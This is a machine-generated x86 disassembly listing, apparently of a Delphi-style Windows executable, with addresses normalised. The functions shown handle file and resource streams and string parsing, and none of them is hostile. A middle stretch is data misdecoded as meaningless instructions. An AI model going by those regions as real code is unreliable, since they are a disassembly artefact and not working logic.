mov eax esp
add eax 0x3
call sub_412520
mov edx eax
add edx 0xa
sub edx esi
mov cx 0x1
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
jmp r-xdata
lea eax [ esp + 0x4 ]
mov edx [ eax ]
sub edx esi
mov cx 0x1
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_434578
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4345d4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_411fec
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_434614
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_41855c
pop ebx
pop ebp
retn 0x8
sub_43463c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
movzx eax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_434680
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_434680
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4347cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
and ax 0xff00
cmp ax 0xff00
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
movzx edx di
mov eax esi
call sub_411ef8
mov ecx eax
xor edx edx
mov eax ebx
call sub_434578
cmp [ ebx + 0x4 ] 0xffffffff
jne r-xdata
and di 0xff
cmp di 0xff
jne r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4347d2
lea eax [ ebp - 0x24 ]
mov edx 0x4
call j_sub_4068c4
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_412418
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_415718
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
movzx edx di
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_411f50
mov ecx eax
xor edx edx
mov eax ebx
call sub_434578
cmp [ ebx + 0x4 ] 0xffffffff
jne r-xdata
mov di 0x10
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412418
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_415718
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
jmp r-xdata
sub_4347d2
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4347f4
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_434830
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4043c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_434868
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_4348a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0xff00
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4348ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43488c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4348f6
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_4348fc
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_434928
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_434940
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_433c88
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_433ebc
sub_434978
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4349c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_434940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4349c7
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_4349cc
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_434828
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_4349f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_4349cc
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_434a20
push ebx
push ecx
mov ebx edx
cmp [ ebx ] 0x0
jle r-xdata
mov edx [ eax + 0x4 ]
mov [ esp ] edx
mov ecx [ ebx ]
mov edx [ eax + 0x10 ]
cmp ecx edx
je r-xdata
mov edx [ ebx ]
cmp edx [ eax + 0x8 ]
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebx ]
add edx 0x1fff
and edx 0xffffe000
mov [ ebx ] edx
test edx edx
jne r-xdata
mov eax [ eax + 0x4 ]
call sub_404220
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov edx [ ebx ]
mov eax esp
call sub_404238
mov eax [ ebx ]
call sub_404204
mov [ esp ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
cmp [ esp ] 0x0
jne r-xdata
sub_434aa0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4043c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_4349cc
sub_434af0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
call sub_407134
mov ecx eax
mov edx esi
mov eax edi
call sub_434c3c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_434b48
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax edi
call sub_434c3c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_434b9c
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434c2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_407254
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_411914
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c35
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_434c3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceW
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_434b9c
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_434828
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebp
call sub_434b9c
pop ecx
sub_434ca8
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_434cf0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_404204
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_434d38
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_404220
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_434d68
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ebp + 0x43 ] 0x0
insb
dec edi
inc ebx
add dl bl
dec ebp
inc ebx
add [ ebx + 0x4e ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ edi + 0x4e ] ah
inc ebx
add [ eax + eax ] bl
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] dh
push ecx
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x60980200
inc edx
add [ eax + eax ] al
add [ eax ] al
or [ esi + 0x49 ] eax
outsb
jae r-xdata
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ edx ] al
sbb ch dl
inc edx
add [ eax ] cl
add [ eax ] al
add [ 0x736e4946 ] cl
je r-xdata
popad
outsb
arpl [ ebp + 0x52 ] sp
outsd
outsd
je r-xdata
imul edi [ eax + 0x75 ] 0x78008070
push eax
inc ebx
add [ esi ] al
inc ebx
jb r-xdata
push esp
outsb
arpl [ ebp + 0x52 ] sp
outsd
outsd
je r-xdata
cmp [ esi ] ch
inc edx
add [ eax ] dl
add [ eax ] cl
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
inc eax
popad
je r-xdata
je r-xdata
jo r-xdata
cmp [ esi ] ch
inc edx
add [ eax + eax ] cl
add [ eax ] al
or [ esi + 0x50 ] eax
jb r-xdata
add [ edx ] al
outsb
jo r-xdata
push esp
push eax
jb r-xdata
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
adc [ eax ] al
or [ eax ] al
adc al [ eax ]
or [ eax ] al
add al 0x4e
add eax [ eax ]
add [ eax ] al
adc [ edx + 0x65 ] dl
jae r-xdata
popad
insd
add al [ gs : eax ]
add al [ eax ]
xor eax [ eax ]
rcl [ eax + 0x43 ] 0x1
add [ ebx ] dl
dec ebp
popad
imul esp [ ebp + 0x47 ] 0x6c
outsd
bound esp [ ecx + 0x6c ]
push edx
jb r-xdata
popad
insd
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
add [ esi + ecx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x2004260 ] bl
add [ eax ] cl
dec ecx
add [ eax ] al
add al 0x53
jo r-xdata
inc eax
add [ eax - 0x2fffbfa8 ] dh
outsb
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ edi + ecx * 2 + 0x43 ] ch
add [ edi ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
add [ eax ] eax
outsb
outsw
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] cl
or [ edx + 0x6f ] dl
outsd
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax + 0x51 ] al
inc ebx
add [ eax ] al
add [ ecx ] al
add [ edi ] al
push eax
inc ebx
add [ edx ] cl
add [ eax ] al
push cs
push esp
push eax
jo r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
add [ eax + 0x50 ] dl
insb
jbe r-xdata
push 0x434f
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
inc ebx
add [ eax ] dh
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
sbb ch dl
inc edx
add [ eax + eax ] dl
or al 0x49
outsb
jae r-xdata
push eax
jb r-xdata
outsb
outsw
add al [ eax ]
add al [ eax + 0x12 ]
inc eax
add [ eax ] dl
add [ eax ] al
add [ ecx ] cl
inc esi
push edx
outsd
outsd
je r-xdata
insb
popad
jae r-xdata
jo r-xdata
inc ebx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
imul edi [ eax + 0x75 ] 0x434dbc70
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add ah ch
dec edi
inc ebx
add [ eax ] al
add [ eax ] al
add al bh
dec edi
inc ebx
add [ eax + eax ] bl
add [ eax ] al
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
jb r-xdata
push ecx
inc ebx
add [ eax ] dl
push edx
jae r-xdata
add [ eax ] al
sbb [ eax ] al
push es
add [ eax + 0x4f ] ch
inc ebx
add [ eax ] al
add [ ebx + edx * 2 ] al
popad
insd
add al [ gs : eax ]
add al [ eax + 0x12 ]
inc eax
add [ eax + eax ] dl
add [ eax ] al
add eax 0x6d614e46
add al [ gs : eax ]
add [ eax ] al
add eax [ eax ]
jb r-xdata
out dx al
jmp r-xdata
jae r-xdata
add al [ eax ]
mov eax eax
push eax
push eax
inc ebx
outsb
je r-xdata
jb r-xdata
jae r-xdata
add [ eax ] al
push eax
push eax
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax + 0x4f ] ch
inc ebx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
or [ edx + 0x65 ] edx
jb r-xdata
outsb
outsb
jae r-xdata
inc ebx
add [ eax + eax - 0xc ] al
push edx
dec esi
inc ebx
add [ edx ] al
hlt
movzx eax [ ebp ]
test ax ax
je r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0x75 ] dl
les ecx [ ebx + ecx * 4 ]
jo r-xdata
add [ eax ] al
pop es
inc esi
imul edi [ eax + 0x75 ] 0x40004370
push ecx
inc ebx
add [ eax ] dl
push edx
jae r-xdata
add [ eax ] al
add [ edx ] al
add al ch
dec edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp ] 0x0
je r-xdata
sub ax 0x2e
jne r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4070a8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4070a8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
or al 0xe8
add [ eax ] esp
std
outsb
je r-xdata
insb
jbe r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx ebp
sub ebx esi
sar ebx 0x1
jns r-xdata
add ebp 0x2
mov eax esi
add esp 0xc
call sub_405b64
pop [ fs : 0x0 ]
pop esi
pop ebx
pop ebp
retn 0x10
add [ eax ] al
add [ ebx - 0x3974f33c ] al
inc ebx
inc esi
imul edi [ eax + 0x75 ] 0x434fe870
add [ eax + 0x4f ] ch
inc ebx
add [ eax ] al
add [ edi ] al
in al dx
push ebx
push esi
test dl dl
je r-xdata
push edx
jb r-xdata
mov ecx ebx
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4071e4
mov ecx ebx
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4078a0
mov bl 0x1
adc ebx 0x0
dec [ ebp + 0x558b1446 ]
or [ ebx - 0x7c170f3c ] al
or bh ch
dec [ ebx - 0x760f7426 ]
dec esi
add al 0x8b
inc ebp
adc al 0x89
inc esi
or [ ebx + 0x46891045 ] cl
or al 0x8d
inc esi
adc [ ebx + 0x1e80c55 ] cl
and ch bh
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax + edx * 2 + 0x43 ] cl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
or [ edx + 0x65 ] edx
jb r-xdata
or al ch
neg [ edi ]
std
dec [ ebx + 0x74db84c6 ]
psubsb mm4 [ edi + 0x64fffd0a ]
pop [ 0x0 ]
inc esi
adc al 0x8b
push ebp
add [ edi ] al
push cs
push esp
push eax
jb r-xdata
outsb
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ ebx + 0x435050c0 ] cl
sub_435078
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4070a8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4070a8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4350d0
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebx ebx
mov eax [ edi + 0x14 ]
call sub_407134
mov esi eax
mov ebp esi
jmp r-xdata
movzx eax [ ebp ]
test ax ax
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
sub ax 0x2e
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx ebp
sub ebx esi
sar ebx 0x1
jns r-xdata
add ebp 0x2
mov ecx ebx
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4071e4
mov ecx ebx
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4078a0
mov bl 0x1
adc ebx 0x0
sub_435140
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4351b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_409cb4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_424418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4351be
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_422f98
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov eax esi
pop edx
call sub_418aa4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_409cb4
sub_4351c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_435291
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435298
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edi esi
mov eax ebx
call sub_407134
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] edi
movzx eax [ ebx ]
test ax ax
je r-xdata
mov ecx ebx
sub ecx [ ebp - 0xc ]
sar ecx 0x1
jns r-xdata
add eax 0xffffffd3
sub ax 0x2
jae r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4071e4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43c860
mov esi eax
test esi esi
jne r-xdata
adc ecx 0x0
add ebx 0x2
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_4110d4
test al al
je r-xdata
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
add ebx 0x2
cmp [ ebx ] 0x3e
jne r-xdata
add ebx 0x2
mov edi esi
add ebx 0x2
sub_4352bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_430608
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_430608
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4303e0
sub_4352f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_430608
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_430608
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_430438
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4303e0
sub_43533c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_435502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_4354e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4354ea
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4354ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_435468
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4305a0
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_42feb4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43546f
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4233bc
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4352bc
pop ecx
mov edx esi
mov eax edi
call sub_430438
mov eax ebx
call sub_4055f0
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4352f4
pop ecx
inc esi
push ebp
mov eax [ ebx + 0x4 ]
call sub_4352f4
pop ecx
inc esi
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4351c4
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
jmp r-xdata
sub_43546f
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
